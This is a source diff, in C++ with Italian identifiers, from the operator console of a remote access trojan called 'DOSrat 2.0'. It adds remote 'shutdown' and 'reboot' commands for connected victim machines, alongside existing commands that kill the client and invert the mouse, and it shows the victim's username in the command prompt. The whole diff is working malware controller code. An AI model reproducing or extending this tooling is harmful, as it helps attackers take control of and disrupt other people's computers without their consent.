@@ -20,16 +20,24 @@ void StampaTitolo(short Returns = 0)
     tc.SetColor(tc.Default);
 }
 
-void StampaPrefix(short PreReturns = 0)
+void StampaPrefix(string NomeClient = "")
 {
     TextColor tc;
-
-    for (int i = 0; i < PreReturns; i++)
-        cout << endl;
 
     tc.SetColor(tc.Yellow);
 
     cout << "DOSrat 2.0";
+
+    if (NomeClient != "")
+    {
+        tc.SetColor(tc.Default);
+        cout << " [";
+        tc.SetColor(tc.Purple);
+        cout << NomeClient;
+        tc.SetColor(tc.Default);
+        cout << "]";
+    }
+
     tc.SetColor(tc.Default);
     cout << "> ";
 }
@@ -197,6 +205,35 @@ bool KillClient(SOCKET Sock, int ID)
 {
     if (COMUNICAZIONI::KillClient(Sock))
     {
+        Sleep(1000);
+        closesocket(Sock);
+        Clients[ID].IsConnected = false;
+        Clu->AggiornaTitolo();
+        return true;
+    }
+
+    return false;
+}
+
+bool Shutdown(SOCKET Sock, int ID)
+{
+    if (COMUNICAZIONI::Shutdown(Sock))
+    {
+        Sleep(1000);
+        closesocket(Sock);
+        Clients[ID].IsConnected = false;
+        Clu->AggiornaTitolo();
+        return true;
+    }
+
+    return false;
+}
+
+bool Reboot(SOCKET Sock, int ID)
+{
+    if (COMUNICAZIONI::Reboot(Sock))
+    {
+        Sleep(1000);
         closesocket(Sock);
         Clients[ID].IsConnected = false;
         Clu->AggiornaTitolo();
@@ -219,7 +256,7 @@ void Sessione(int ID, SOCKET Sock)
 
     for (bool Controllo = true; Controllo;)
     {
-        StampaPrefix();
+        StampaPrefix(Clients[ID].info.UserName);
         getline(cin, cmd);
         cmd = ToLowerCase(cmd);
 
@@ -235,7 +272,7 @@ void Sessione(int ID, SOCKET Sock)
             if (!InvertMouse(Sock, ID))
                 Controllo = CheckConnection(Sock, ID);
         }
-        else if (cmd.find("exit") != string::npos || cmd.find("menu") != string::npos)
+        else if (cmd.find("exit") != string::npos || cmd.find("close") != string::npos)
             Controllo = false;
         else if (cmd.find("reconnect") != string::npos)
         {
@@ -253,6 +290,20 @@ void Sessione(int ID, SOCKET Sock)
         else if (cmd.find("killclient") != string::npos)
         {
             if (!KillClient(Sock, ID))
+                Controllo = CheckConnection(Sock, ID);
+            else
+                Controllo = false;
+        }
+        else if (cmd.find("shutdown") != string::npos)
+        {
+            if (!Shutdown(Sock, ID))
+                Controllo = CheckConnection(Sock, ID);
+            else
+                Controllo = false;
+        }
+        else if (cmd.find("reboot") != string::npos)
+        {
+            if (!Reboot(Sock, ID))
                 Controllo = CheckConnection(Sock, ID);
             else
                 Controllo = false;
